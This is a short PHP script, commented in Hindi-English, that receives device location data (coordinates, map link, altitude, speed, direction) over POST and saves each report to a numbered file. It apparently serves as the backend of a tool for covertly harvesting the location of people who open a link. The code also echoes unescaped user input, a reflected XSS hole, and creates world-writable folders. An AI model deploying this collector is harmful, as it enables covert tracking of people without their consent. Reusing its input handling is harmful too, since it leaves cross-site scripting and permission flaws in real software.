<?php
// Server ka system time use hoga — koi timezone set nahi kiya gaya

if (isset($_POST["error_message"])) {
    $error_message = $_POST["error_message"];
    echo "$error_message";

    // Error folder banaye agar nahi hai
    if (!is_dir("error")) {
        mkdir("error", 0777, true);
    }

    // Error file mein likhna
    $file = fopen("error/error.txt", "a");
    fwrite($file, $error_message . "\n--------------------------\n");
    fclose($file);
} else {
    // Location data receive karo
    $latitude = $_POST["latitude"];
    $longitude = $_POST["longitude"];
    $map_url = $_POST["map_url"];
    $altitude = $_POST["altitude"];
    $accuracy = $_POST["accuracy"];
    $speed = $_POST["speed"];
    $direction = $_POST["direction"];

    // Folder "location" banaye agar nahi hai
    $folder = "Device_location";
    if (!is_dir($folder)) {
        mkdir($folder, 0777, true);
    }

    // Agli available file number dhoondo
    $i = 1;
    do {
        $filename = "$folder/location$i.txt";
        $i++;
    } while (file_exists($filename));

    // System time lo
    $dateTime = date("Y-m-d H:i:s");

    // Content prepare karo
    $details = "Date/Time          : $dateTime
Latitude           : $latitude
Longitude          : $longitude
Google Map         : $map_url
Altitude           : $altitude
Accuracy           : $accuracy
Speed              : $speed
Direction          : $direction
";

    echo "$details";

    // File mein likho
    $file = fopen($filename, "w");
    fwrite($file, $details . "\n--------------------------\n");
    fclose($file);
}

exit();
?>
